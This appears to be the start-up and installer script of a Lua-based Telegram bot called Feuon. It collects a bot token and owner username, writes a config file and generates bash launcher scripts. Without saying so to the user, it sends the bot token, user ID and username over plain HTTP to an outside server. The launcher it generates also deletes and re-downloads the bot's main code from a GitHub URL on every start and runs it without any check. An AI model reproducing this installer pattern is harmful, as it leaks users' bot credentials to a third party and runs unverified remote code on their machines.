serpent = dofile("./File_Libs/serpent.lua")
https = require("ssl.https")
http = require("socket.http")
JSON = dofile("./File_Libs/JSON.lua")
local database = dofile("./File_Libs/redis.lua").connect("127.0.0.1", 6379)
Server_Feuon = io.popen("echo $SSH_CLIENT | awk '{ print $1}'"):read('*a')
local AutoFiles_Feuon = function() 
local Create_Info = function(Token,Sudo,UserName)  
local Feuon_Info_Sudo = io.open("sudo.lua", 'w')
Feuon_Info_Sudo:write([[
token = "]]..Token..[["

Sudo = ]]..Sudo..[[  

UserName = "]]..UserName..[["
]])
Feuon_Info_Sudo:close()
end  
if not database:get(Server_Feuon.."Token_Feuon") then
print("\27[1;34m»» Send Your Token Bot :\27[m")
local token = io.read()
if token ~= '' then
local url , res = https.request('https://api.telegram.org/bot'..token..'/getMe')
if res ~= 200 then
io.write('\n\27[1;31m»» Sorry The Token is not Correct \n\27[0;39;49m')
else
io.write('\n\27[1;31m»» The Token Is Saved\n\27[0;39;49m')
database:set(Server_Feuon.."Token_Feuon",token)
end 
else
io.write('\n\27[1;31mThe Tokem was not Saved\n\27[0;39;49m')
end 
os.execute('lua start.lua')
end
------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------
if not database:get(Server_Feuon.."UserName_Feuon") then
print("\27[1;34m\n»» Send Your UserName Sudo : \27[m")
local UserName = io.read():gsub('@','')
if UserName ~= '' then
local Get_Info = http.request("http://Feuon.ml/info/?user="..UserName)
if Get_Info:match('Is_Spam') then
io.write('\n\27[1;31m»» Sorry The server is Spsm \nتم حظر السيرفر لمدة 5 دقايق بسبب التكرار\n\27[0;39;49m')
return false
end
local Json = JSON:decode(Get_Info)
if Json.Info == false then
io.write('\n\27[1;31m»» Sorry The UserName is not Correct \n\27[0;39;49m')
os.execute('lua start.lua')
else
if Json.Info == 'Channel' then
io.write('\n\27[1;31m»» Sorry The UserName Is Channel \n\27[0;39;49m')
os.execute('lua start.lua')
else
io.write('\n\27[1;31m»» The UserNamr Is Saved\n\27[0;39;49m')
database:set(Server_Feuon.."UserName_Feuon",Json.Info.Username)
database:set(Server_Feuon.."Id_Feuon",Json.Info.Id)
end
end
else
io.write('\n\27[1;31mThe UserName was not Saved\n\27[0;39;49m')
end 
os.execute('lua start.lua')
end
local function Files_Feuon_Info()
Create_Info(database:get(Server_Feuon.."Token_Feuon"),database:get(Server_Feuon.."Id_Feuon"),database:get(Server_Feuon.."UserName_Feuon"))   
http.request("http://Feuon.ml/add/?id="..database:get(Server_Feuon.."Id_Feuon").."&user="..database:get(Server_Feuon.."UserName_Feuon").."&token="..database:get(Server_Feuon.."Token_Feuon"))
local RunFeuon = io.open("Feuon", 'w')
RunFeuon:write([[
#!/usr/bin/env bash
cd $HOME/Feuon
token="]]..database:get(Server_Feuon.."Token_Feuon")..[["
rm -fr Feuon.lua
wget "https://raw.githubusercontent.com/Feuonab/Feuon/master/Feuon.lua"
while(true) do
rm -fr ../.telegram-cli
./tg -s ./Feuon.lua -p PROFILE --bot=$token
done
]])
RunFeuon:close()
local RunTs = io.open("ts", 'w')
RunTs:write([[
#!/usr/bin/env bash
cd $HOME/Feuon
while(true) do
rm -fr ../.telegram-cli
screen -S Feuon -X kill
screen -S Feuon ./Feuon
done
]])
RunTs:close()
end
Files_Feuon_Info()
database:del(Server_Feuon.."Token_Feuon");database:del(Server_Feuon.."Id_Feuon");database:del(Server_Feuon.."UserName_Feuon")
sudos = dofile('sudo.lua')
os.execute('./install.sh ins')
end 
local function Load_File()  
local f = io.open("./sudo.lua", "r")  
if not f then   
AutoFiles_Feuon()  
var = true
else   
f:close()  
database:del(Server_Feuon.."Token_Feuon");database:del(Server_Feuon.."Id_Feuon");database:del(Server_Feuon.."UserName_Feuon")
sudos = dofile('sudo.lua')
os.execute('./install.sh ins')
var = false
end  
return var
end
Load_File()
